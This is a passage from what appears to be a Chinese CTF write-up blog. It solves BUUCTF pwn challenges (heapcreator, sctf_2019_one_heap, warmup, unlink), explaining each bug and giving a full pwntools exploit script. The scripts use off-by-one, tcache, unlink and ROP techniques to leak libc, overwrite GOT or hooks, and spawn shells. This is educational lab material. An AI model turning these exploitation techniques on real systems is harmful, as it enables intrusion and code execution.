class="hljs-string">&quot;3&quot;</span>)<br>p.recvuntil(<span class="hljs-string">&quot;Index :&quot;</span>)<br>p.sendline(<span class="hljs-built_in">str</span>(idx))<br><br>shell = <span class="hljs-number">0x0000000000400C50</span><br>magic = <span class="hljs-number">0x00000000006020A0</span><br>add(<span class="hljs-number">0x60</span>,<span class="hljs-string">&#x27;aaaa&#x27;</span>) <span class="hljs-comment">#0</span><br>add(<span class="hljs-number">0x60</span>,<span class="hljs-string">&#x27;bbbb&#x27;</span>) <span class="hljs-comment">#1</span><br>add(<span class="hljs-number">0x60</span>,<span class="hljs-string">&#x27;cccc&#x27;</span>) <span class="hljs-comment">#2</span><br>free(<span class="hljs-number">1</span>)<br>payload = <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x68</span> + p64(<span class="hljs-number">0x70</span>) + p64(magic-<span class="hljs-number">0x20</span>+<span class="hljs-number">0xd</span>)<br>edit(<span class="hljs-number">0</span>,payload)<br><span class="hljs-comment">#debug()</span><br>add(<span class="hljs-number">0x60</span>,p64(<span class="hljs-number">4870</span>))<br>add(<span class="hljs-number">0x60</span>,p8(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span> + p64(<span class="hljs-number">4870</span>))<br><br>p.sendlineafter(<span class="hljs-string">&quot;Your choice :&quot;</span>,<span class="hljs-string">&quot;4869&quot;</span>)<br>p.interactive()<br></code></pre></td></tr></table></figure><h2 id="十二、hitcontraining-heapcreator"><a href="#十二、hitcontraining-heapcreator" class="headerlink" title="十二、hitcontraining_heapcreator"></a>十二、hitcontraining_heapcreator</h2><p><img src="/2021/08/12/2021-08-12-buu07/image-20210829092850758.png" alt="image-20210829092850758"></p><p>常规checksec，开了NX、Cannary</p><p><img src="/2021/08/12/2021-08-12-buu07/image-20210829094339915.png" alt="image-20210829094339915"></p><p>进入IDA，阅读完代码后，在edit函数中，存在明显的溢出一个字节的漏洞（offbyone）</p><p>因为有offbyone漏洞在，那肯定是朝着去修改堆头的大小去的，最终达成overlap</p><p><img src="/2021/08/12/2021-08-12-buu07/image-20210829104050093.png" alt="image-20210829104050093"></p><p>先申请出这些堆块，其中第一个是要申请0x18的，因为这样才能覆盖到下一个堆块的size位。然后因为RELRO和PIE的缘故，我选择劫持got表的方法，所以第四个堆块内容就是写着/bin/sh\x00的。当然，也可以把/bin/sh\x00写到第0个堆块上</p><p><img src="/2021/08/12/2021-08-12-buu07/image-20210829104713815.png" alt="image-20210829104713815"></p><p>此时只要再把这个释放了，然后再申请同样大小的堆块回来，那么我们就可以操控其中本来是第二堆块的内容</p><p>然后把可以操控的堆结构内容修改为free的got表地址，从而可以利用show函数打印出libc地址。最后再写入sys即可getshell</p><p><img src="/2021/08/12/2021-08-12-buu07/image-20210829110519523.png" alt="image-20210829110519523"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!usr/bin/env python </span><br><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> LibcSearcher<br>context(arch = <span class="hljs-string">&#x27;amd64&#x27;</span>,os = <span class="hljs-string">&#x27;linux&#x27;</span>,log_level = <span class="hljs-string">&#x27;debug&#x27;</span>)<br>elf = ELF(<span class="hljs-string">&quot;./heapcreator&quot;</span>)<br>libc = ELF(<span class="hljs-string">&quot;/home/shoucheng/glibc-all-in-one/libs/2.23-0ubuntu11.2_amd64/libc-2.23.so&quot;</span>)<br><span class="hljs-comment">#libc = ELF(&quot;./libc-2.23.so&quot;)</span><br>ld = ELF(<span class="hljs-string">&quot;/home/shoucheng/glibc-all-in-one/libs/2.23-0ubuntu11.2_amd64/ld-2.23.so&quot;</span>)<br>p = process(argv=[ld.path,elf.path],env=&#123;<span class="hljs-string">&quot;LD_PRELOAD&quot;</span> : libc.path&#125;)<br>p = remote(<span class="hljs-string">&quot;node4.buuoj.cn&quot;</span>,<span class="hljs-number">26372</span>)<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span>():</span><br>gdb.attach(p,<span class="hljs-string">&quot;b main&quot;</span>)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span>(<span class="hljs-params">size,content</span>):</span><br>p.sendlineafter(<span class="hljs-string">&quot;Your choice :&quot;</span>,<span class="hljs-string">&quot;1&quot;</span>)<br>p.recvuntil(<span class="hljs-string">&quot;Size of Heap : &quot;</span>)<br>p.sendline(<span class="hljs-built_in">str</span>(size))<br>p.recvuntil(<span class="hljs-string">&quot;Content of heap:&quot;</span>)<br>p.send(content)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">edit</span>(<span class="hljs-params">idx,content</span>):</span><br>p.sendlineafter(<span class="hljs-string">&quot;Your choice :&quot;</span>,<span class="hljs-string">&quot;2&quot;</span>)<br>p.recvuntil(<span class="hljs-string">&quot;Index :&quot;</span>)<br>p.sendline(<span class="hljs-built_in">str</span>(idx))<br>p.recvuntil(<span class="hljs-string">&quot;Content of heap : &quot;</span>)<br>p.send(content)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">show</span>(<span class="hljs-params">idx</span>):</span><br>p.sendlineafter(<span class="hljs-string">&quot;Your choice :&quot;</span>,<span class="hljs-string">&quot;3&quot;</span>)<br>p.recvuntil(<span class="hljs-string">&quot;Index :&quot;</span>)<br>p.sendline(<span class="hljs-built_in">str</span>(idx))<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">free</span>(<span class="hljs-params">idx</span>):</span><br>p.sendlineafter(<span class="hljs-string">&quot;Your choice :&quot;</span>,<span class="hljs-string">&quot;4&quot;</span>)<br>p.recvuntil(<span class="hljs-string">&quot;Index :&quot;</span>)<br>p.sendline(<span class="hljs-built_in">str</span>(idx))<br><br>free_got = elf.got[<span class="hljs-string">&quot;free&quot;</span>]<br>add(<span class="hljs-number">0x18</span>,<span class="hljs-string">&#x27;a&#x27;</span>) <br>add(<span class="hljs-number">0x10</span>,<span class="hljs-string">&#x27;b&#x27;</span>) <br>add(<span class="hljs-number">0x10</span>,<span class="hljs-string">&#x27;c&#x27;</span>) <br>add(<span class="hljs-number">0x10</span>,<span class="hljs-string">&quot;/bin/sh\x00&quot;</span>) <br>edit(<span class="hljs-number">0</span>,<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x18</span>+<span class="hljs-string">&#x27;\x81&#x27;</span>)<br>free(<span class="hljs-number">1</span>)<br>add(<span class="hljs-number">0x70</span>,<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x40</span> + p64(<span class="hljs-number">0x8</span>) + p64(free_got))<br>show(<span class="hljs-number">2</span>)<br>p.recvuntil(<span class="hljs-string">&quot;Content : &quot;</span>)<br>free = u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\x00&#x27;</span>))<br>log.success(<span class="hljs-built_in">hex</span>(free))<br>libc=LibcSearcher(<span class="hljs-string">&quot;free&quot;</span>,free)<br>sys=libc.dump(<span class="hljs-string">&quot;system&quot;</span>)+free-libc.dump(<span class="hljs-string">&quot;free&quot;</span>)<br>edit(<span class="hljs-number">2</span>,p64(sys))<br>free(<span class="hljs-number">3</span>)<br>p.interactive()<br></code></pre></td></tr></table></figure><h2 id="十三、sctf-2019-one-heap"><a href="#十三、sctf-2019-one-heap" class="headerlink" title="十三、sctf_2019_one_heap"></a>十三、sctf_2019_one_heap</h2><p><img src="/2021/08/12/2021-08-12-buu07/image-20210830160009616.png" alt="image-20210830160009616"></p><p>checksec一下，64位，保护全开</p><p><img src="/2021/08/12/2021-08-12-buu07/image-20210830163315917.png" alt="image-20210830163315917"></p><p>进入IDA，堆的菜单只有两种功能，申请和释放</p><p><img src="/2021/08/12/2021-08-12-buu07/image-20210830163404930.png" alt="image-20210830163404930"></p><p>申请的堆块不能大于0x7f，并且申请和释放都有次数限制（其中能申请0xf次，释放4次）。而且，堆块我们只能访问到当前申请出的堆块</p><p><img src="/2021/08/12/2021-08-12-buu07/image-20210830163542538.png" alt="image-20210830163542538"></p><p>释放堆块时，指针没有置0</p><p><img src="/2021/08/12/2021-08-12-buu07/image-20210830185924091.png" alt="image-20210830185924091"></p><p><img src="/2021/08/12/2021-08-12-buu07/image-20210830200649131-1630325227529.png" alt="image-20210830200649131"></p><p><img src="/2021/08/12/2021-08-12-buu07/image-20210830201741615.png" alt="image-20210830201741615"></p><p>连续释放两次大小为0x70的堆块，进入到tcache bin 中，然后根据一个字节未知进行爆破，使得堆块分配tcache_perthread_struct（就是开头0x250的那个堆块）上</p><p><img src="/2021/08/12/2021-08-12-buu07/image-20210830203528418.png" alt="image-20210830203528418"></p><p>把数值改为7，然后再把这个堆块释放，将会进入到unsorted bin中</p><p><img src="/2021/08/12/2021-08-12-buu07/image-20210830210232915.png" alt="image-20210830210232915"></p><p><img src="/2021/08/12/2021-08-12-buu07/image-20210830210216419.png" alt="image-20210830210216419"></p><p>fd，bk已经指向了libc中某个地址了，所以后面还是爆破一个字节，去让stdout吐出libc地址。然后因为tcache结构被改动很大，要先修复一下</p><p>后面其实就没有什么了，就是申请出堆块，因为我们把tcache_perthread_struct释放了，所以申请出的堆块都在上面，那么可以通过这个来填写出目标地址，然后就会进入到tcache bin中，接着再申请就能任意地址写。这边还要注意的就是还要用realloc调整一下rsp</p><p>然后这边说下，不知道是不是运气问题，爆破上千次都没打通</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!usr/bin/env python </span><br><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-comment">#context(arch = &#x27;amd64&#x27;,os = &#x27;linux&#x27;,log_level = &#x27;debug&#x27;)</span><br>elf = ELF(<span class="hljs-string">&quot;./sctf_2019_one_heap&quot;</span>)<br>libc = ELF(<span class="hljs-string">&quot;/home/shoucheng/glibc-all-in-one/libs/2.27-3ubuntu1.2_amd64/libc-2.27.so&quot;</span>)<br>libc = ELF(<span class="hljs-string">&quot;./libc-2.27.so&quot;</span>)<br>ld = ELF(<span class="hljs-string">&quot;/home/shoucheng/glibc-all-in-one/libs/2.27-3ubuntu1.2_amd64/ld-2.27.so&quot;</span>)<br>p = process(argv=[ld.path,elf.path],env=&#123;<span class="hljs-string">&quot;LD_PRELOAD&quot;</span> : libc.path&#125;)<br><span class="hljs-comment">#p = remote(&quot;node4.buuoj.cn&quot;,28247)</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span>():</span><br>gdb.attach(p,<span class="hljs-string">&quot;b main&quot;</span>)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span>(<span class="hljs-params">size,content</span>):</span><br>p.sendlineafter(<span class="hljs-string">&quot;Your choice:&quot;</span>,<span class="hljs-string">&quot;1&quot;</span>)<br>p.recvuntil(<span class="hljs-string">&quot;Input the size:&quot;</span>)<br>p.sendline(<span class="hljs-built_in">str</span>(size))<br>p.recvuntil(<span class="hljs-string">&quot;Input the content:&quot;</span>)<br>p.sendline(content)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">free</span>():</span><br>p.sendlineafter(<span class="hljs-string">&quot;Your choice:&quot;</span>,<span class="hljs-string">&quot;2&quot;</span>)<br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">0x4f2c5 execve(&quot;/bin/sh&quot;, rsp+0x40, environ)</span><br><span class="hljs-string">constraints:</span><br><span class="hljs-string">  rsp &amp; 0xf == 0</span><br><span class="hljs-string">  rcx == NULL</span><br><span class="hljs-string"></span><br><span class="hljs-string">0x4f322 execve(&quot;/bin/sh&quot;, rsp+0x40, environ)</span><br><span class="hljs-string">constraints:</span><br><span class="hljs-string">  [rsp+0x40] == NULL</span><br><span class="hljs-string"></span><br><span class="hljs-string">0x10a38c execve(&quot;/bin/sh&quot;, rsp+0x70, environ)</span><br><span class="hljs-string">constraints:</span><br><span class="hljs-string">  [rsp+0x70] == NULL</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">pwn</span>(<span class="hljs-params">first,second</span>):</span><br>add(<span class="hljs-number">0x70</span>,<span class="hljs-string">&#x27;a&#x27;</span>)<br>free()<br>free()<br>add(<span class="hljs-number">0x70</span>,p16((first &lt;&lt; <span class="hljs-number">8</span>) | <span class="hljs-number">0x10</span>))<br>add(<span class="hljs-number">0x70</span>,p8(<span class="hljs-number">0x10</span>))<br>add(<span class="hljs-number">0x70</span>,p64(<span class="hljs-number">0</span>) * <span class="hljs-number">4</span> + p64(<span class="hljs-number">0x07000000</span>))<br>free()<br>add(<span class="hljs-number">0x40</span>, p64(<span class="hljs-number">0</span>) * <span class="hljs-number">5</span>)<br>add(<span class="hljs-number">0x10</span>,p64(<span class="hljs-number">0</span>) + p16((second &lt;&lt; <span class="hljs-number">8</span>) | <span class="hljs-number">0x60</span>))<br>add(<span class="hljs-number">0x40</span>,p64(<span class="hljs-number">0xfbad1800</span>) + p64(<span class="hljs-number">0</span>) * <span class="hljs-number">3</span> + <span class="hljs-string">&#x27;\x00&#x27;</span>)<br>p.recv(<span class="hljs-number">8</span>)<br>leak_addr = u64(p.recvuntil(<span class="hljs-string">&#x27;\x7f&#x27;</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\x00&#x27;</span>))<br>log.success(<span class="hljs-string">&quot;leak_addr==&gt;0x%x&quot;</span> %leak_addr)<br>libc_base = leak_addr - <span class="hljs-number">0x3ed8b0</span><br>ogg = libc_base + <span class="hljs-number">0x10a38c</span><br>realloc_hook = libc_base + libc.sym[<span class="hljs-string">&quot;__realloc_hook&quot;</span>]<br>realloc = libc_base + libc.sym[<span class="hljs-string">&quot;realloc&quot;</span>]<br>log.success(<span class="hljs-string">&quot;realloc==&gt;0x%x&quot;</span> %realloc)<br>log.success(<span class="hljs-string">&quot;one_gadget==&gt;0x%x&quot;</span> %ogg)<br>add(<span class="hljs-number">0x10</span>,p64(<span class="hljs-number">0</span>) + p64(realloc_hook))<br>add(<span class="hljs-number">0x40</span>,p64(ogg) + p64(realloc + <span class="hljs-number">0x4</span>))<br>add(<span class="hljs-number">0x10</span>)<br><br><span class="hljs-keyword">try</span>:<br>p.sendline(<span class="hljs-string">&quot;id&quot;</span>)<br>p.recvline_contains(<span class="hljs-string">&quot;uid&quot;</span>, timeout=<span class="hljs-number">2</span>)<br>p.sendline(<span class="hljs-string">&quot;cat flag&quot;</span>)<br>p.interactive()<br><span class="hljs-keyword">except</span>:<br><span class="hljs-keyword">try</span>:<br>p.close()<br><span class="hljs-keyword">except</span>:<br><span class="hljs-keyword">pass</span><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>n = <span class="hljs-number">0x1000</span><br><span class="hljs-keyword">while</span> n &gt; <span class="hljs-number">0</span>:<br>log.success(<span class="hljs-string">&quot;counts: &#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-number">0x1000</span> - n))<br><span class="hljs-keyword">try</span>:<br>pwn(<span class="hljs-number">0x60</span>,<span class="hljs-number">0x67</span>)<br><span class="hljs-keyword">except</span>:<br><span class="hljs-keyword">pass</span><br><span class="hljs-comment">#p = process(argv=[ld.path,elf.path],env=&#123;&quot;LD_PRELOAD&quot; : libc.path&#125;)</span><br>p = remote(<span class="hljs-string">&quot;node4.buuoj.cn&quot;</span>,<span class="hljs-number">28247</span>)<br>n -= <span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><h2 id="十四、warmup"><a href="#十四、warmup" class="headerlink" title="十四、warmup"></a>十四、warmup</h2><p><img src="/2021/08/12/2021-08-12-buu07/image-20210831104431370.png" alt="image-20210831104431370"></p><p>常规checksec一下，32位，只开了NX</p><p>进入IDA，发现函数很少，而且都是调用系统调用号执行函数的。所以肯定是要执行到0xB的execve函数来getshell</p><p><img src="/2021/08/12/2021-08-12-buu07/image-20210831104803643.png" alt="image-20210831104803643"></p><p>首先，要先制造出/bin/sh\x00才行，所以先跳转到read上去，往.bss段上写/bin/sh\x00。仔细看，这边传递的read的参数，都是来自于栈上的，而且都是esp前面的地址存的值，所以其实我们就是按照平常的写法，返回地址覆盖为这里的地址，然后再写一个新的返回地址，后面跟上read的三个参数<code>payload = &#39;a&#39;*0x20+p32(read)+p32(start)+p32(0)+p32(bss)+p32(8)</code></p><p>然后返回到最初再次执行，因为执行完函数的返回值是存在eax中的，所以为了达成0xb，第二次执行read函数时，要输入0xb个数据，因为execve(/bin/sh,0,0)，所以我们第二次的返回地址要直接返回到read函数传参（此时eax已经是0xb了，不能再执行0x804811D，不然eax的值将会被修改），因为执行完ret后，esp会加4，移动到我们溢出的p32(0)，然后传参才会把/bin/sh地址传入到ebx中，而0x8048212这个地址，在于这个地址上的值必须是0，满足这个要求即可，这样才能满足后续传入的是两个0</p><p><img src="/2021/08/12/2021-08-12-buu07/image-20210831104312190.png" alt="image-20210831104312190"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!usr/bin/env python </span><br><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br><span class="hljs-comment">#p = remote(&quot;node4.buuoj.cn&quot;,25785)</span><br>p = process(<span class="hljs-string">&quot;./warmup&quot;</span>)<br>bss = <span class="hljs-number">0x80491bc</span><br>start = <span class="hljs-number">0x080480D8</span><br>read = <span class="hljs-number">0x0804811D</span><br>gdb.attach(p)<br>p.recvuntil(<span class="hljs-string">&#x27;2016!&#x27;</span>)<br>payload=<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x20</span>+p32(read)+p32(start)+p32(<span class="hljs-number">0</span>)+p32(bss)+p32(<span class="hljs-number">8</span>)<br>p.send(payload)<br>p.send(<span class="hljs-string">&#x27;/bin/sh\x00&#x27;</span>)<br><br>payload=<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x20</span>+p32(read)+p32(<span class="hljs-number">0x08048122</span>)+p32(<span class="hljs-number">0</span>)+p32(bss)+p32(<span class="hljs-number">0x8048212</span>)<br>p.send(payload)<br>p.send(<span class="hljs-string">&#x27;/bin/sh\x00&#x27;</span> + <span class="hljs-string">&#x27;a&#x27;</span> * <span class="hljs-number">3</span>  )<br>p.interactive()<br></code></pre></td></tr></table></figure><h2 id="十五、hitcontraining-unlink"><a href="#十五、hitcontraining-unlink" class="headerlink" title="十五、hitcontraining_unlink"></a>十五、hitcontraining_unlink</h2><p><img src="/2021/08/12/2021-08-12-buu07/image-20210831153526197.png" alt="image-20210831153526197"></p><p>常规checksec一下，64位，开了NX，Canary</p><p><img src="/2021/08/12/2021-08-12-buu07/image-20210831154605863.png" alt="image-20210831154605863"></p><p>进入IDA，四个菜单功能都具备，同时还找到个后门函数，但是看路径，应该是用不了的，buu的flag就在根目录下的</p><p><img src="/2021/08/12/2021-08-12-buu07/image-20210831155631822.png" alt="image-20210831155631822"></p><p>漏洞点在于修改函数里面，对于修改的size没有检查，存在堆溢出</p><p>由于在输入后会加0截断，并且没开PIE，堆指针简单可寻，所以这题用unlink做。目标是劫持atoi的got，</p><p><img src="/2021/08/12/2021-08-12-buu07/image-20210831202645476.png" alt="image-20210831202645476"></p><p>这里是触发了unlink，下一个大小为0x80的堆块与我们伪造的大小为0x40的堆块合并放入unsorted bin 中</p><p><img src="/2021/08/12/2021-08-12-buu07/image-20210831203042925.png" alt="image-20210831203042925"></p><p><img src="/2021/08/12/2021-08-12-buu07/image-20210831203937694.png" alt="image-20210831203937694"></p><p>同时，指向chunk0的指针保存的地址换为了ptr - 0x18的值，所以，此时可以认为chunk0变成是在ptr - 0x18的地方了。所以此时再把堆指针改为函数got表地址，从而泄露libc地址</p><p>而刚好，此时又是atoi的got表地址，所以直接继续往里面写入system的地址即可，最后再输入/bin/sh\x00即可</p><p><img src="/2021/08/12/2021-08-12-buu07/image-20210831204445381.png" alt="image-20210831204445381"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!usr/bin/env python </span><br><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(arch = <span class="hljs-string">&#x27;amd64&#x27;</span>,os = <span class="hljs-string">&#x27;linux&#x27;</span>,log_level = <span class="hljs-string">&#x27;debug&#x27;</span>)<br>elf = ELF(<span class="hljs-string">&quot;./1&quot;</span>)<br>libc = ELF(<span class="hljs-string">&quot;/home/shoucheng/glibc-all-in-one/libs/2.23-0ubuntu11.2_amd64/libc-2.23.so&quot;</span>)<br>libc = ELF(<span class="hljs-string">&quot;./libc-2.23.so&quot;</span>)<br>ld = ELF(<span class="hljs-string">&quot;/home/shoucheng/glibc-all-in-one/libs/2.23-0ubuntu11.2_amd64/ld-2.23.so&quot;</span>)<br>p = process(argv=[ld.path,elf.path],env=&#123;<span class="hljs-string">&quot;LD_PRELOAD&quot;</span> : libc.path&#125;)<br>p = remote(<span class="hljs-string">&quot;node4.buuoj.cn&quot;</span>,<span class="hljs-number">25062</span>)<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span>():</span><br>gdb.attach(p,<span class="hljs-string">&quot;b main&quot;</span>)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span>(<span class="hljs-params">size,content</span>):</span><br>p.sendlineafter(<span class="hljs-string">&quot;Your choice:&quot;</span>,<span class="hljs-string">&quot;2&quot;</span>)<br>p.recvuntil(<span class="hljs-string">&quot;length of item name:&quot;</span>)<br>p.sendline(<span class="hljs-built_in">str</span>(size))<br>p.recvuntil(<span class="hljs-string">&quot;the name of item:&quot;</span>)<br>p.send(content)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">edit</span>(<span class="hljs-params">idx,content</span>):</span><br>p.sendlineafter(<span class="hljs-string">&quot;Your choice:&quot;</span>,<span class="hljs-string">&quot;3&quot;</span>)<br>p.recvuntil(<span class="hljs-string">&quot;index of item:&quot;</span>)<br>p.sendline(<span class="hljs-built_in">str</span>(idx))<br>p.recvuntil(<span class="hljs-string">&quot;length of item name:&quot;</span>)<br>p.sendline(<span class="hljs-built_in">str</span>(<span class="hljs-built_in">len</span>(content)))<br>p.recvuntil(<span class="hljs-string">&quot;the new name of the item:&quot;</span>)<br>p.send(content)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">show</span>():</span><br>p.sendlineafter(<span class="hljs-string">&quot;Your choice:&quot;</span>,<span class="hljs-string">&quot;1&quot;</span>)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">free</span>(<span class="hljs-params">idx</span>):</span><br>p.sendlineafter(<span class="hljs-string">&quot;Your choice:&quot;</span>,<span class="hljs-string">&quot;4&quot;</span>)<br>p.recvuntil(<span class="hljs-string">&quot;the index of item:&quot;</span>)<br>p.sendline(<span class="hljs-built_in">str</span>(idx))<br><br>atoi_got = elf.got[<span class="hljs-string">&#x27;atoi&#x27;</span>]<br>ptr = <span class="hljs-number">0x00000000006020C8</span><br>add(<span class="hljs-number">0x40</span>,<span class="hljs-string">&#x27;a&#x27;</span>)<br>add(<span class="hljs-number">0x80</span>,<span class="hljs-string">&#x27;b&#x27;</span>)<br>add(<span class="hljs-number">0x80</span>,<span class="hljs-string">&#x27;c&#x27;</span>)<br>fake_chunk = p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x41</span>) <span class="hljs-comment">#fake_chunk header</span><br>fake_chunk += p64(ptr - <span class="hljs-number">0x18</span>) + p64(ptr - <span class="hljs-number">0x10</span>) <span class="hljs-comment">#fake_chunk fd  bk</span><br>fake_chunk += <span class="hljs-string">&#x27;a&#x27;</span> * <span class="hljs-number">0x20</span> + p64(<span class="hljs-number">0x40</span>) + p64(<span class="hljs-number">0x90</span>) <span class="hljs-comment">#fake prev_size size</span><br>edit(<span class="hljs-number">0</span>,fake_chunk)<br>free(<span class="hljs-number">1</span>)<br>payload = p64(<span class="hljs-number">0</span>) * <span class="hljs-number">2</span> + p64(<span class="hljs-number">0x40</span>) + p64(atoi_got)<br>edit(<span class="hljs-number">0</span>,payload)<br>show()<br>p.recvuntil(<span class="hljs-string">&#x27;0 : &#x27;</span>)<br>libc_base = u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\x00&#x27;</span>)) - libc.sym[<span class="hljs-string">&#x27;atoi&#x27;</span>]<br>log.success(<span 